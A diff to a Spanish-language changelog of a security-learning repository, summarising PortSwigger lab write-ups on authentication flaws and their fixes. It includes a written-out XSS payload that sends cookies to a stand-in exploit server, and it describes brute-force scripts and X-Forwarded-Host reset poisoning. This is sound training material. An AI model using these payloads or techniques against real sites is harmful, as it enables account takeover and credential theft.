@@ -2,6 +2,180 @@
 
 Todos los cambios notables en este proyecto serán documentados en este archivo.
 
+## [2026-05-08] — Writeup PortSwigger Password brute-force via password change + script `bruteforce.py`
+
+Lab Practitioner que cierra el cluster auth de PortSwigger sumando un sexto writeup. Cambia el target del ataque: no es el login form (donde están todas las defensas - rate-limit, lockout, captcha) sino el endpoint **post-login** `POST /my-account/change-password`. El defender concentró defensas en el login asumiendo que post-auth ya no era superficie crítica; el resultado es un endpoint que valida credenciales sin las defensas del login y termina siendo brute-force oracle universal. Combinación de tres defectos: `username` honrado del body (no de sesión), branches de error distinguibles según validez del current-password, y kick-on-failure que invalida sesión sin lockear cuenta. Credenciales encontradas: `carlos:summer` (~50 intentos del wordlist canónico).
+
+### Hallazgos no triviales documentados en el writeup
+
+1. **Asimetría defensiva entre login y change-password**: el threat model del defender asume que post-login el atacante "ya superó el login". Falso: la sesión es barata (login propia + `wiener:peter` regalada por el lab). Cualquier endpoint que valide credenciales necesita las mismas defensas que el login. La concentración de defensas en login crea una superficie estrictamente más débil en endpoints adyacentes.
+2. **`username` en body como antipattern**: el endpoint acepta `username` controlable por el cliente y lo usa para el lookup del current-password. Mismo patrón que IDOR (`?account_id=42`), mass assignment, host header injection. La fix correcta: target user de `session['user_id']`, nunca del body. Si admin necesita cambiar passwords de otros, endpoint separado con permission check explícito.
+3. **El truco del `new-password-1 != new-password-2` para forzar el oráculo**: enviando new mismatched, el server entra en una rama de validación donde primero chequea current-password antes de comparar los nuevos. El error message diferencia entre "Current password is incorrect" (kick a /login) y "New passwords do not match" (200 informativo). Sin esa asimetría intencional, el atacante no podría usar el endpoint como oráculo. Lección para defenders: **validar todos los inputs antes de cualquier check de credenciales**, así la rama "current incorrecto + new mismatch" deja de existir como path distinto.
+4. **El kick-on-failure no es defensa, es señal**: invalidar la sesión cuando current-password falla **comunica** al atacante que falló. La defensa silenciosa (mantener sesión, registrar intento server-side, lockear tras N) es estrictamente mejor. Bonus: el kick añade re-login costo al brute-force (2 requests/candidato), pero sigue siendo trivial con paralelismo.
+5. **Rama 4-quadrants para encontrar el oráculo**: probar las 4 combinaciones (user propio/víctima × current correcto/incorrecto) con new mismatched es la disciplina canónica para mapear oráculos. En este lab: `(wiener, correcto)` → 200 informativo; las otras tres → 302 kick. Esa única asimetría es el oráculo binario.
+6. **Patrón general - auth oracles en endpoints autenticados**: aparece en email change, account verification, account deletion, 2FA disable, API token revocation. Cualquier endpoint que (a) acepte target controlable y (b) revele validez de credenciales en branches de error distintos es un oráculo. Defensa: respuestas uniformes byte-a-byte en todas las ramas de fallo.
+7. **Detección por content vs status**: con `requests.Session()` siguiendo redirects por default, el 302 a /login se resuelve a 200 del login form. La detección por status falla. El discriminador robusto es **el contenido**: `b"New passwords do not match" in r.content`, que sólo aparece cuando current-password matchea. Lección: cuando el side-channel es semántico (mensaje), validar por contenido aunque el status también difiera.
+
+### Iteración real durante la resolución
+
+Mapping de los 4 cuadrantes con el usuario fue la fase clave: el primer test (username=carlos sin más) dio 302 que parecía cerrar el vector. Hizo falta probar new-password mismatched para revelar la asimetría real. El usuario lo hizo correctamente y el oráculo apareció claro en el quadrant `(wiener, peter, mismatched)` vs los otros tres. Sin la disciplina de los 4 cuadrantes, era fácil descartar el lab como "no vulnerable a este vector".
+
+### Archivos nuevos
+- **`learning/portswigger/password-brute-force-via-password-change/writeup.md`**: 7 secciones con tabla de los 4 cuadrantes del oráculo, código del antipatrón vs implementación correcta del state machine de change-password, comparación con los 5 labs auth previos del cluster, patrón general de oráculos post-login, diagrama Mermaid de la cadena completa.
+- **`learning/portswigger/password-brute-force-via-password-change/bruteforce.py`**: ~140 líneas, `ThreadPoolExecutor` con re-login automático antes de cada candidato (porque server invalida sesión en cada fallo), discriminador por contenido `"New passwords do not match"`, soporta `--target` y `--attacker-*` para reusar contra otros labs/setups.
+- **`learning/portswigger/password-brute-force-via-password-change/passwords.txt`**: wordlist canónica de PortSwigger (100 passwords), copiada de labs anteriores.
+
+### Conexión inventario
+- `explotacion-brute-force-advanced.md`: + `portswigger/password-brute-force-via-password-change` en `learning_refs:` (6 writeups ahora). + 5 aliases nuevos: `password brute-force via change-password, change-password as oracle, post-login auth oracle, asymmetric defense, defense asymmetry login vs change-password`.
+
+### Verificación
+- `bash scripts/check.sh` ✓ (132/132 OK, indexes idempotentes).
+- Lab marcado solved: banner `is-solved` confirmado tras login con `carlos:summer` y visit a `/my-account`.
+
+---
+
+## [2026-05-08] — Writeup PortSwigger Password reset poisoning via middleware
+
+Lab Practitioner que cierra el cluster de password reset (segundo writeup de la familia, junto a "broken logic"). Vector distinto: en lugar de atacar la lógica del token, ataca el canal de delivery del email. El backend confía en `X-Forwarded-Host` para construir la URL absoluta del link de reset, sin validar contra una allowlist. Inyectando ese header con el dominio del exploit server, el link en el email de carlos apunta a un dominio que controlamos; cuando el lab simula su click, el token se filtra al access log. Resolución end-to-end: ~5 minutos guiada por el usuario en Burp Repeater + Email client + Access log del exploit server. Lab marcado solved con `carlos:hacked123`.
+
+### Hallazgos no triviales documentados en el writeup
+
+1. **`X-Forwarded-Host` vs `Host:` directo**: cambiar `Host:` falla porque el reverse proxy enruta por ese header y rechaza la request si no matchea su vhost. `X-Forwarded-Host` es el bypass elegante: el proxy lo deja pasar (no afecta enrutamiento), el backend lo prefiere sobre `Host:` para construir URLs. Mantenés `Host:` legítimo para pasar el middleware e inyectás `X-Forwarded-Host:` para envenenar el backend. Esa es la mecánica del "via middleware" en el título del lab.
+2. **Confused Deputy class**: el backend asume que `X-Forwarded-Host` viene del proxy (entidad confiable), cuando en realidad viene del cliente (no confiable). El proxy no strippea ni normaliza el header de input. Mismo patrón aparece en `X-Real-IP` para auth, `X-Forwarded-For` para rate-limiting, `Origin` cuando se usa como autorización CSRF.
+3. **Validar el vector con tu cuenta antes de carlos**: si el header no funciona, ves el fallo con tu email. Atacar carlos directo sin confirmar quema un token que se le envió a su email real (no controlable) y consume un intento sin saber por qué. Disciplina general en pentesting: probar la mecánica con la cuenta propia antes de quemarla con la víctima.
+4. **El exploit server como sink de capturas**: `Access log` del exploit server logea cualquier request que reciba, incluyendo URL completa con query string. Status 404 (porque el exploit server no tiene handler para `/forgot-password`) **no impide** la captura: la request se logea antes de procesarse. User-agent `(Victim)` confirma que el lab simuló el click de carlos.
+5. **Hostname desde config, no del request**: la fix correcta es cargar `APP_HOSTNAME` de variable de entorno al boot y usarla para todas las URLs absolutas. Sin fallback a headers del request. Multi-tenant requiere allowlist explícita (`ALLOWED_HOSTS = {"app.example.com", ...}`) y rechazo de cualquier otro valor.
+6. **Diferencia con "Password reset broken logic"**: ambos son ATO via reset, pero por capas distintas. Broken logic ataca la lógica de validación del token (re-uso, predicción, falta de binding). Via middleware ataca el canal de delivery del token (envenena el link). Las fix son distintas: el primero requiere lógica server-side correcta, el segundo requiere config estática del hostname.
+7. **Patrón general - Host header injection**: el mismo defecto puede aparecer en verification emails, magic login links, cache poisoning, SSRF lateral, open redirect. La defensa unificada: nunca confiar en headers del cliente para identidad o construcción de URLs.
+
+### Iteración real durante la resolución
+
+El usuario inicialmente compartió la request del paso final del reset (POST con `new-password-1` y `new-password-2`) en lugar de la request inicial (POST con `username=wiener`). Tuvimos que pedirle que reprodujera el primer paso. Útil aprendizaje: cuando uno guía un lab paso a paso, ser específico sobre qué request del flujo se necesita capturar; los users pueden submitir el flujo completo end-to-end antes de que pidamos por separado.
+
+### Archivos nuevos
+- **`learning/portswigger/password-reset-poisoning-via-middleware/writeup.md`**: 7 secciones con datos reales de la corrida (cookies, tokens, headers, URLs antes y después del envenenamiento), código del antipatrón vs implementación correcta del hostname desde config, tabla comparativa con "broken logic", patrón general Host header injection, diagrama Mermaid de la cadena de 8 pasos.
+
+### Conexión inventario
+- `explotacion-password-reset-flaws.md`: + `portswigger/password-reset-poisoning-via-middleware` en `learning_refs:` (2 writeups ahora junto a `password-reset-broken-logic`).
+
+### Verificación
+- `bash scripts/check.sh` ✓ (132/132 OK, indexes idempotentes).
+- Lab marcado solved: banner `is-solved` confirmado en `/my-account?id=carlos`.
+
+---
+
+## [2026-05-08] — Writeup PortSwigger Offline password cracking (cadena XSS + cookie + MD5)
+
+Lab Practitioner que encadena tres vulnerabilidades distintas: stored XSS en comentarios, cookie `stay-logged-in` sin `HttpOnly` con formato `base64(user:md5(pwd))`, y password storage MD5 sin salt. Ataque: postear comentario con `<script>document.location='//exploit-server/'+document.cookie</script>`, esperar al bot víctima, leer cookie del access log del exploit server, decodificar, crackear MD5 (CrackStation lookup en este caso), login y delete account. Credenciales: `carlos:onceuponatime` (deterministic en este lab para que CrackStation lo indexe).
+
+### Hallazgos no triviales documentados en el writeup
+
+1. **Defensa en profundidad solo funciona si las capas son ortogonales**. Las cuatro defensas (XSS sanitization, HttpOnly, opaque tokens, bcrypt) atacan dimensiones distintas — no son redundantes en el mismo eje. Sustituir una por "tenemos otra fuerte" deja abierto el agujero correspondiente. La cadena del lab existe porque las cuatro fallaron simultáneamente; cerrar cualquiera (excepto la última) la rompe enteramente.
+2. **El hash exfiltrado es información persistente; la sesión robada es información temporal**. Aún si una sesión expira, el password recuperado del hash es reusable hasta que el usuario lo cambie — semanas o nunca. Hace este lab más grave que un session-hijack puro: compromiso de identidad de larga duración.
+3. **Footprint mínimo vs el lab anterior**: brute-forcing de cookie generaba 100+ requests sospechosos al lab; este genera 1 comentario benigno + 1 login válido. Defensor ve patrón de actividad normal. La sigilosidad del XSS-driven attack es un argumento adicional para que las apps protejan ese vector, más allá del impacto directo.
+4. **Los listeners JS son parte del contrato del form, no decoración**. Mi automatización del POST `/my-account/delete` falló porque leí solo el HTML estático (button bare sin token visible) e ignoré que el lab espera un handler JS asociado a `#delete-account-form` que probablemente añade un campo o header al confirm. El click manual del usuario en browser sí disparó esa lógica. **Lección operacional**: para reproducir un click sensible, primero interceptar la request real en Burp Repeater y reproducir EXACTAMENTE ese payload, no inferir desde el HTML.
+5. **PortSwigger usa passwords deterministicos en estos labs**: `onceuponatime` está hardcoded para que CrackStation/Google lo indexe. Eso permite al alumno ver el ataque sin depender del estado de wordlists locales o de tener GPU. En un escenario real con password obscuro: hashcat con rockyou+rules en GPU resuelve la mayoría; passwords realmente random fallarían y el atacante quedaría limitado a la sesión activa.
+6. **Comparación con el lab anterior** (brute-forcing stay-logged-in cookie): mismo formato de cookie, vector totalmente distinto. Online vs offline. 100 requests vs 2. Wordlist requerida vs no. Tabla detallada en §4.3 del writeup.
+
+### Archivos nuevos
+- **`learning/portswigger/offline-password-cracking/writeup.md`**: 7 secciones con análisis de la cadena de 3 vulnerabilidades, tabla de qué pasa si se cierra cada vector, jerarquía de defensas (5 niveles ortogonales), mecánicas del bot simulado, lección operacional sobre el delete form. Diagrama Mermaid de 13 pasos.
+
+### Conexión inventario
+- `explotacion-session-cookies-debiles.md`: + `portswigger/offline-password-cracking` en `learning_refs:` (2 writeups ahora). + 3 aliases nuevos (`cookie exfiltration via XSS, offline password cracking from cookie, MD5 password hash leak`).
+- `explotacion-xss.md`: + `portswigger/offline-password-cracking` en `learning_refs:` (cross-link al primer eslabón de la cadena).
+
+### Verificación
+- `bash scripts/check.sh` ✓ (132 archivos, 132/132 OK, indexes idempotentes).
+- Lab marcado solved (browser): banner "Solved" verificado por screenshot del usuario.
+
+---
+
+## [2026-05-07] — Writeup PortSwigger Brute-forcing stay-logged-in cookie + nuevo `explotacion-session-cookies-debiles.md`
+
+Primer lab del cluster "Other authentication mechanisms" de PortSwigger. Cambia el target del ataque: ya no es el form de login sino la cookie persistente. Formato de la cookie: `base64(username + ":" + md5(password))`. Sin salt, MD5 rapido, y formato hash-as-token. 100 candidatos sequential = ~2 segundos. Credenciales: `carlos:12345` (pwd #6 del wordlist).
+
+### Hallazgos no triviales documentados en el writeup
+
+1. **Tres antipatterns acumulados, cualquiera basta para romperla**: (a) MD5 rapido (~10⁹ h/s GPU, rainbow tables disponibles), (b) sin salt (mismo pwd → mismo hash siempre, cross-application leakage), (c) hash-as-token (compromiso de la DB = compromiso de cookies sin necesidad de craquear hashes). Los tres juntos vuelven el ataque trivial; la regla simple: cualquier cookie cuya validez sea verificable client-side sin lookup en server-side store es brute-forceable o forgeable.
+2. **El "remember me" sortea TODAS las defensas del login form**. El lab anterior tenia rate-limit, lockout, account-lockout-as-oracle. Este endpoint (`GET /my-account`) no aplica ninguna de esas defensas porque el defender consideró la cookie "menos crítica". Es exactamente al revés: una sesión persistente que pasa por todas las defensas del login form es MAS critica que el login form mismo. Lección de auditoría: pedir el código del flow de remember-me antes que el del login.
+3. **El patrón correcto es opaque session token**: `secrets.token_urlsafe(32)` random, almacenado en server-side store con metadata (expiración, IP, user-agent, revocation). El cliente lleva una clave de busqueda, no estado. Compromiso de la DB ≠ compromiso de cookies. Revocación server-side instantánea.
+4. **Variantes mas modernas siguen rotas**: SHA-256 sin salt es peor (mas rapido); bcrypt en cookie cliente-side sigue dando cookies validas tras DB leak; AES_encrypt(KEY,...) cae si KEY se extrae del binario; JWT-HS256 cae si secret es brute-forceable. Solo opaque tokens con server-side lookup son robustos por construcción.
+5. **Diferencias estructurales con el lab anterior**: cookie no incrementa contador del login form, MD5 toma <1µs vs bcrypt 100-200ms, no hay account locking, deteccion de exito por marker `Update email` (boton solo visible autenticado). 2 segundos vs 1.5 minutos del lab anterior.
+6. **Decisión de estructura del inventario**: el tema no encajaba en `explotacion-brute-force-advanced.md` (esta es session/cookie security, no brute-force al login). Creado archivo nuevo `04-explotacion/web/explotacion-session-cookies-debiles.md` que cubre el cluster: cookies que codifican credenciales, remember-me tokens, session tokens predictables. MITRE T1539 + T1110.001. Hogar para futuros labs de session-mgmt de PortSwigger.
+
+### Archivos nuevos
+- **`learning/portswigger/brute-forcing-stay-logged-in-cookie/writeup.md`**: 7 secciones con análisis de los 3 antipatterns, código del antipattern vs fix con opaque tokens, tabla comparativa con login form attacks, diagrama Mermaid.
+- **`learning/portswigger/brute-forcing-stay-logged-in-cookie/cookie_brute.py`**: script de ~70 líneas que itera passwords, arma `base64(target:md5(pwd))`, GET /my-account?id=target con cookie, detecta marker `Update email`.
+- **`learning/portswigger/brute-forcing-stay-logged-in-cookie/passwords.txt`**: wordlist canónica de PortSwigger.
+- **`inventario/04-explotacion/web/explotacion-session-cookies-debiles.md`**: archivo nuevo del inventario. Cubre cookies derivadas, opaque vs derived tokens, herramientas (Burp Sequencer, CookieMonster, flask-unsign, hashcat), workflow Burp Intruder con payload processing, y patrón correcto de session management. MITRE [T1539, T1110.001].
+
+### Conexión inventario
+- Inventario crece a **132 archivos** (era 131). `04-explotacion/web/INDEX.md` regenerado con la nueva entrada. `TOPICS.md` y los 4 facetados (`by-mitre`, `by-difficulty`, `by-platform`, `by-fase`) regenerados.
+- Cross-references: el nuevo archivo lista en `related:` a `explotacion-jwt` y `explotacion-brute-force-advanced` (puentes naturales).
+
+### Verificación
+- `bash scripts/check.sh` ✓ (132 archivos, 132/132 OK, indexes idempotentes).
+- Lab marcado solved: `<section class='academyLabBanner is-solved'>`.
+
+---
+
+## [2026-05-07] — Writeup PortSwigger 2FA broken logic + script `bruteforce.py`
+
+Lab Practitioner que extiende la serie de MFA bypass. A diferencia de "2FA simple bypass" (donde el paso 2 no se enforce server-side), acá el paso 2 sí enforcea pero el server identifica al usuario a verificar mediante una cookie `verify=<username>` controlable por el cliente, en vez de derivarla de la sesión del paso 1. Combinado con OTP de 4 dígitos sin rate-limit, takeover trivial. Resolución real: ~1 minuto con script Python paralelo, código `0239` para carlos.
+
+### Hallazgos no triviales documentados en el writeup
+
+1. **Composición de dos defectos de severidad media → severidad crítica**: confusión de identidad (`verify` cookie controlable) y OTP sin rate-limit son cada uno problema serio pero acotado. Juntos: el atacante puede *generar* un OTP válido para carlos en su propia sesión y *brute-forcearlo* sin lockout. La fix de cualquiera de los dos rompe la cadena, lo que ilustra defensa en profundidad como "capas distintas" no "capas iguales".
+2. **Identidad debe derivar de sesión, no del cliente**: la cookie `verify=carlos` plaintext es el antipatrón canónico, cede al cliente la autoridad sobre "qué usuario está siendo verificado". La implementación correcta guarda `user_id` y `stage=PENDING_OTP` en sesión server-side; el paso 2 nunca consulta cookies/params del cliente para identidad. Mismo patrón que IDOR clásico (`?account_id=42`), privesc por hidden input, mass assignment.
+3. **OTP debe ligarse a `(user_id, session_id)`, no solo a user**: un código emitido en sesión A no debería validar en sesión B aunque el username coincida. Esto rompe el ataque incluso si `verify` cookie sigue siendo manipulable.
+4. **Server rota la sesión incluso en intentos fallidos**: el `Set-Cookie: session=...` aparece tanto en éxito como en error de OTP. Típicamente la rotación es solo en éxito (anti session-fixation). Hacerla siempre sugiere implementación apresurada y no aporta seguridad. No afecta el brute-force porque el script reusa la cookie del template ignorando los `Set-Cookie` del server.
+5. **Diferencia conceptual con simple bypass**: simple bypass = estado mal modelado (no hay distinción `PENDING_OTP` vs `AUTHENTICATED`). Broken logic = identidad mal atribuida (sesión y target del 2FA desacoplados). Ambos llevan al mismo resultado por mecanismos distintos; las fix son distintas.
+6. **Burp Community vs Python paralelo**: Intruder Community throttlea a ~1 req/s (~3h peor caso para 10⁴). `ThreadPoolExecutor` con 30 workers cubre los 10.000 candidatos en <1 minuto. Relevante para pentest real: la "ventana de explotación" cambia de horas a minutos, y los defenders tienen que dimensionar rate-limits asumiendo paralelismo agresivo, no la velocidad de Intruder Community.
+
+### Archivos nuevos
+- **`learning/portswigger/2fa-broken-logic/writeup.md`**: 7 secciones con datos reales de la corrida (cookies, códigos OTP, longitudes), tabla comparativa simple bypass vs broken logic, código del antipatrón vs implementación correcta del state machine + binding de OTP a sesión, sección sobre por qué Burp Community no escala, diagrama Mermaid de la cadena.
+- **`learning/portswigger/2fa-broken-logic/bruteforce.py`**: ~120 líneas, `ThreadPoolExecutor` de 30 workers, refresca OTP cada N intentos vía `--refresh-every`, detecta éxito por status 302, captura la session post-2FA y emite comando `curl` listo para `/my-account?id=carlos`.
+
+### Conexión inventario
+- `explotacion-mfa-bypass.md`: + `portswigger/2fa-broken-logic` en `learning_refs:` (2 writeups ahora junto a `2fa-simple-bypass`).
+
+### Verificación
+- `bash scripts/check.sh` ✓ (132 archivos, 132/132 OK, indexes idempotentes).
+- Lab marcado solved: banner `is-solved` confirmado vía curl.
+
+---
+
+## [2026-05-07] — Writeup PortSwigger Username enumeration via account lock
+
+Lab Practitioner que cierra el cluster de username enumeration con un signal nuevo: **lockout asimétrico**. El defender introduce account-lockout (5 fails consecutivos → cuenta bloqueada 1 min) como protección anti-brute-force, pero solo lockea cuentas existentes. La asimetría revela existencia: usernames inválidos siempre devuelven `Invalid`; el válido cambia a `Too many incorrect login attempts` tras 5 attempts. Credenciales: `app:111111`.
+
+### Hallazgos no triviales documentados en el writeup
+
+1. **El error de modelo costoso**: mi primer enfoque diseñó phase 2 con batches de 4 y waits de 65s para no relockear durante el brute-force, asumiendo que el lock era obstáculo a evitar. Estimación: 40+ minutos. **Realidad observada**: el lock fired al 4° intento del primer batch. El contador no decae completamente al expirar el lock — queda en 2-3 (decay parcial). Modelo del decay equivocado.
+2. **El truco del PortSwigger writeup oficial**: NO batchear, NO esperar. Blastear los 100 passwords contra la cuenta lockeada. La mayoría responden con marker de lock; **una respuesta no contiene ningún marker de error** — esa es el password correcto. El check de credenciales sucede independiente del lockout: si el pwd es correcto, la respuesta cambia (length 3158 vs 3236) aunque la cuenta esté bloqueada. **25× más rápido** (1.5 min vs 40 min).
+3. **El lock no enmascara el oracle de phase 2; lo desplaza**. El instinto de tratar el lock como obstáculo en vez de como signal nuevo fue el error conceptual. El password correcto destaca por *ausencia* de marker contra el background uniforme de respuestas locked. Misma idea que phase 1 (la asimetría es el signal), aplicada en otro nivel.
+4. **Las dos asimetrías del lockout naive**: (a) asimetría en quién acumula counter (existe vs no existe → cierra phase 1); (b) asimetría en respuesta cuando pwd es correcto bajo lock (cualquier rama distinta para `(pwd correcto, locked)` filtra → cierra phase 2). Fix correcto requiere counter universal (con TTL) Y respuesta byte-idéntica en los 4 cuadrantes del producto `(user existe) × (lock activo)`.
+5. **Lockout NO es defensa standalone**: mal implementado, downgrade defensivo. Introduce signals que el atacante no tendría sin el lockout. Necesita combinarse con counter universal, respuesta uniforme, decay (no lock duro), y idealmente captcha+2FA.
+6. **Lección meta-cognitiva**: cuando el costo de una técnica parece desproporcionado al problema, parar y verificar contra fuente externa. La diferencia entre 40 min y 1.5 min no era optimización sino cambio de modelo. Pedagógicamente lo más valioso del lab.
+
+### Iteración real de debugging documentada
+
+El writeup §3.2 documenta el camino completo: versión inicial con batches abortando al 4° intento, lectura del writeup oficial revelando el blast-through, reescritura del script con classify(), verificación. No oculta el error inicial — es el insight central del lab.
+
+### Archivos nuevos
+- **`learning/portswigger/username-enumeration-via-account-lock/writeup.md`**: 7 secciones con tabla de los 4 cuadrantes (user existe × lock activo), código del antipatrón vs fix, comparación con los 4 labs anteriores de auth, diagrama Mermaid.
+- **`learning/portswigger/username-enumeration-via-account-lock/bruteforce.py`**: 3 fases (enum por marker, blast con classify en buckets locked/invalid/neither/success, verify con sleep+login). Soporta `--known-user` para saltar phase 1.
+- **`learning/portswigger/username-enumeration-via-account-lock/{usernames,passwords}.txt`**: wordlists copiadas de labs anteriores (PortSwigger usa lista canónica).
+
+### Conexión inventario
+- `explotacion-brute-force-advanced.md`: + `portswigger/username-enumeration-via-account-lock` en `learning_refs:` (5 writeups ahora). + 3 aliases nuevos: `account lock as oracle, lockout asymmetry, blast through lockout`.
+
+### Verificación
+- `bash scripts/check.sh` ✓ (131 archivos, 131/131 OK, indexes idempotentes).
+- Lab marcado solved: `<section class='academyLabBanner is-solved'>`.
+
+---
+
 ## [2026-05-07] — Writeup PortSwigger Broken brute-force protection, IP block
 
 Lab Practitioner que cierra el cluster de protección contra brute-force después de la serie de username enumeration. La defensa parece sólida (3 fallos consecutivos por IP → lock), pero contiene una falla **lógica explícita**: cualquier login exitoso desde esa IP resetea el contador. Atacante con cuenta propia (`wiener:peter`) puede intercalar logins exitosos entre intentos contra `carlos`, manteniendo el contador siempre por debajo del threshold. Credenciales encontradas: `carlos:yankees` (posición 85 del wordlist).
